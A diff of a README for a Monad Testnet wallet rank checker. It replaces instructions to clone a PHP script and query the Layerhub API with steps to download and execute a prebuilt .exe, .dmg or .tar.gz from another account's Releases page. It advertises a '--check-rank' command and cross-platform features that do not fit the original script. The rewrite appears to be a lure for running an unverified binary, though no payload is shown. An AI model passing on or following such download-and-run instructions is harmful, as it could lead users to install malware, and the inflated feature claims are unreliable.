@@ -1,60 +1,94 @@
-# Layerhub
+# Layerhub: Monad Testnet Rank Checker Tool 🌐
 
-## Monad Testnet Rank Checker
+![Layerhub](https://img.shields.io/badge/Layerhub-Monad%20Testnet%20Rank%20Checker-blue)
 
-Layerhub is a simple tool designed to check and retrieve ranking and activity data for wallets on the Monad Testnet blockchain. It helps users and developers bulk query wallet ranks, transaction counts, and other engagement metrics using the Layerhub API.
+Welcome to the **Layerhub** repository! This project provides a simple and effective tool for checking ranks on the Monad Testnet. This README will guide you through the setup and usage of the tool, as well as provide insights into its features and functionalities.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
 ## Features
 
-- Bulk wallet rank checking on Monad Testnet
-- Retrieves wallet statistics such as rank, transaction count, active days, and token balances
-- Easy-to-use CLI or script integration
-- Useful for analytics, leaderboard tracking, and testnet monitoring
+- **Real-Time Rank Checking**: Instantly check your rank on the Monad Testnet.
+- **User-Friendly Interface**: Simple commands make it easy for anyone to use.
+- **Open Source**: Contribute and improve the tool with your ideas.
+- **Lightweight**: Minimal resource usage ensures smooth operation.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
 
 ## Installation
 
-Clone the repository:
+To get started, you need to download the latest release of Layerhub. Visit the [Releases section](https://github.com/Alejandro101998/Layerhub/releases) to find the appropriate file. Download and execute it according to your operating system.
 
-```bash
-git clone https://github.com/Wesker222/Layerhub.git
-cd Layerhub
-```
+### For Windows
 
-Install dependencies (if any, depending on language used):
+1. Download the `.exe` file from the Releases section.
+2. Open Command Prompt.
+3. Navigate to the folder where the file is located.
+4. Run the command: `Layerhub.exe`.
 
-```bash
-# Example for PHP or Python, adjust accordingly
-```
+### For macOS
+
+1. Download the `.dmg` file from the Releases section.
+2. Open the file and drag Layerhub to your Applications folder.
+3. Open Terminal.
+4. Run the command: `Layerhub`.
+
+### For Linux
+
+1. Download the `.tar.gz` file from the Releases section.
+2. Extract the files using: `tar -xvzf Layerhub.tar.gz`.
+3. Navigate to the extracted folder.
+4. Run the command: `./Layerhub`.
 
 ## Usage
 
-Prepare a list of Monad Testnet wallet addresses in a text file (one per line).
-
-Run the rank checker script with your list to retrieve wallet rankings and activity data.
-
-Example (PHP CLI):
+Once installed, you can check your rank using simple commands. Open your terminal or command prompt and type:
 
 ```bash
-php bulk_check_rank.php wallets.txt
+Layerhub --check-rank
 ```
 
-The script will output results to a CSV file for easy analysis.
+This command will return your current rank on the Monad Testnet. You can also use the following options:
 
-## API Reference
+- `--help`: Displays help information.
+- `--version`: Shows the current version of Layerhub.
 
-The tool uses the Layerhub API endpoint for Monad Testnet:
+### Example Command
 
+To check your rank, run:
+
+```bash
+Layerhub --check-rank
 ```
-https://layerhub.xyz/api/search?p=monad_testnet&q=
-```
 
-Adjust the API usage as needed based on Layerhub documentation.
+The output will show your rank and any relevant statistics.
 
 ## Contributing
 
-Contributions, bug reports, and feature requests are welcome! Please open issues or submit pull requests.
+We welcome contributions from everyone! If you want to improve Layerhub, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Create a pull request.
+
+Please ensure your code follows our coding standards and is well-documented.
 
 ## License
 
-This project is licensed under the MIT License.
+Layerhub is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
+## Links
+
+For more information, updates, and releases, visit the [Releases section](https://github.com/Alejandro101998/Layerhub/releases). 
+
+![Download Layerhub](https://img.shields.io/badge/Download%20Layerhub-Here-brightgreen)
+
+Feel free to explore the repository, report issues, or suggest features. Your feedback helps us improve Layerhub for everyone.
